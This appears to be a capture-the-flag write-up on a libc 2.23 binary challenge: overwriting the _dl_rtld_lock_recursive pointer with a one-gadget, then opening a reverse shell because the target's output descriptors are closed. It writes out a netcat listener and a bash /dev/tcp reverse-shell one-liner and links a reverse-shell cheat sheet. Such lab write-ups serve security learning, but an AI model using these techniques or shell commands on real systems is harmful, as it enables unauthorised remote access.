# reverse shell web
- https://www.revshells.com/
# Solve
- In this task, i learnt 2 main techniques, which is rtld global's func ptr overwrite and reverse shell
## Overwrite lock recursive pointer
<img width="832" height="421" alt="image" src="https://github.com/user-attachments/assets/b6e8e175-3aca-4e0c-b409-6ac4a25f67ba" />

- The code of challenge is pretty simple, it give me libc which i can get libc base then close fd 1 and 2
- I also can overwrite 1 byte of any address that is chosen by my first inpput. And this loop 5 times
- That means i can write maximum 5 bytes to a value of an address
- Because this is libc 2.23, which has recursive lock pointer (newer version is hid or encrypted), ill overwrite _dl_rtld_lock_recursive function ptr stored in rtld global
- Command to search its address fast: p &_rtld_global._dl_rtld_lock_recursive

- After overwrite:
<img width="963" height="351" alt="image" src="https://github.com/user-attachments/assets/82f56995-09de-4e89-9189-99306a5ea55e" />
- Before:
<img width="1097" height="287" alt="image" src="https://github.com/user-attachments/assets/1fbc8f39-4e3e-4542-a1d6-473074fc408d" />

- As you can see, before overwrite lock function with one gadget, it is a libc addr, which means its most significant byte always 0x7f
- My one gadget is also a libc address too, so i only need to overwrite exactly 5 bytes so it will become one gadget
- The only thing i need to be aware is if it requirements satisfied
<img width="962" height="297" alt="image" src="https://github.com/user-attachments/assets/da6a7098-3cc8-4e19-a2a5-9cb2df1b7697" />

- To confirm that, i need to check the stack when the program is ready to call it
- From what i debugged, before it call my one gadget, it will call rdx in my debugger
<img width="962" height="566" alt="image" src="https://github.com/user-attachments/assets/cefd54bf-ec89-4988-aaf6-8fad63ef7d6b" />

- I dont know what function is stored in rdx, the only thing i know is it will do recursive thing in that function
- Thats why the program must call lock first to avoid data condition bug, but i had overwriten lock ptr so it will call shell

<img width="958" height="933" alt="image" src="https://github.com/user-attachments/assets/61f9548e-44fd-4c2d-abf0-f0219a41d0a7" />

- At this stage, the program will call lock, which i replaced with one gadget
  
- Ill check stack requirement at this stage to choose suitable one gadget then get shell
  
## Recursive shell

- This is the final stage after getting shell. I need to use this techinque because the program's fd 1 and fd 2 are closed

- This mean even if i get shell, i cant get anything from the target as it will output nothing

- To fix this, ill use recursive shell

- The main idea of this technique is to execute new shell in my local host, which has fd 1,2,0 as sockets and all of it are bidirectional pipes. In other words ill use the target's shell to connect to my own server with new shell on

- The new shell will just like the shell in a server, all it pipes are bidirectional, it uses sockets to output / input

- The only different is i controlled the server by default because it is my server

- And most importantly, it has all pipes open

### Create mini host

- nc -lvnp 1337

### Connect to mini host by target's shell

- bash -c 'bash -i >& /dev/tcp/127.0.0.1/1337 0>&1'

### Bonus

- There are various reverse shell that is written in different language and for different OS

- Note that i have to know the target's OS type to know what reverse shell to use. Because each OS may has different shell type and some reverse shell comand may not work with that shell

- For example, if i use bash command to reverse shell, most times it works if the target is using linux. But if they use window, it will result in error and do nothing

- There is a web that contains various reverse shell command for numerous languages and OS that i can use as blueprints for my own reverse shell command: https://www.revshells.com/
